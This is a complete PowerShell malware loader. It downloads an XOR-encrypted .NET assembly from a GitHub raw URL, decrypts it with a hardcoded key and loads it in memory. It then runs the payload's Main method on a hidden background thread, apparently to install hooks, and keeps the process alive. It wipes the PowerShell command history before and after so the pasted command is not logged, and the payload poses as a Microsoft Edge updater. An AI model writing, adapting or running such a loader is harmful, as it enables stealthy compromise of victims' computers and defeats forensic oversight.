$payloadUrl = "https://raw.githubusercontent.com/RE4PERxAlive/edgeupdate/refs/heads/main/payload.bin"
$keyString  = "MySecretKey998877"
$entryType  = "MicrosoftEdgeUpdate.Program"

# --- PREP ---
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- PATH TO PSReadLine history file ---
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# --- WIPE HISTORY FIRST (so paste isn't logged) ---
try {
    if (Test-Path $histFile) {
        [System.IO.File]::WriteAllText($histFile, "")
    }
} catch { }

# --- DOWNLOAD PAYLOAD ---
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $encrypted = $wc.DownloadData($payloadUrl)
} catch {
    Write-Host "Download failed" -ForegroundColor Red
    exit 1
}

if (-not $encrypted -or $encrypted.Length -eq 0) {
    Write-Host "Empty payload" -ForegroundColor Red
    exit 1
}

# --- XOR DECRYPT ---
$key  = [System.Text.Encoding]::ASCII.GetBytes($keyString)
$data = New-Object byte[] $encrypted.Length
for ($i = 0; $i -lt $encrypted.Length; $i++) {
    $data[$i] = $encrypted[$i] -bxor $key[$i % $key.Length]
}

# --- LOAD ASSEMBLY IN MEMORY ---
$asm = [System.Reflection.Assembly]::Load($data)

# --- FIND ENTRY TYPE ---
$type = $asm.GetType($entryType)
if (-not $type) {
    foreach ($t in $asm.GetTypes()) {
        $m = $t.GetMethod("Main",
            [System.Reflection.BindingFlags]::Static -bor `
            [System.Reflection.BindingFlags]::Public -bor `
            [System.Reflection.BindingFlags]::NonPublic)
        if ($m) { $type = $t; break }
    }
}

if (-not $type) {
    Write-Host "Entry type not found" -ForegroundColor Red
    exit 1
}

# --- GET MAIN METHOD ---
$main = $type.GetMethod("Main",
    [System.Reflection.BindingFlags]::Static -bor `
    [System.Reflection.BindingFlags]::Public -bor `
    [System.Reflection.BindingFlags]::NonPublic)

if (-not $main) {
    Write-Host "Main not found" -ForegroundColor Red
    exit 1
}

# --- START MAIN ON BACKGROUND STA THREAD ---
$thread = New-Object System.Threading.Thread ([System.Threading.ThreadStart]{
    try {
        $main.Invoke($null, @(,[string[]]@()))
    } catch { }
})
$thread.SetApartmentState([System.Threading.ApartmentState]::STA)
$thread.IsBackground = $true
$thread.Start()

# --- WAIT FOR HOOKS TO INSTALL, THEN WIPE HISTORY AGAIN ---
Start-Sleep -Milliseconds 1000
try {
    if (Test-Path $histFile) {
        [System.IO.File]::WriteAllText($histFile, "")
    }
} catch { }

# --- KEEP POWERSHELL ALIVE ---
while ($true) { Start-Sleep -Seconds 60 }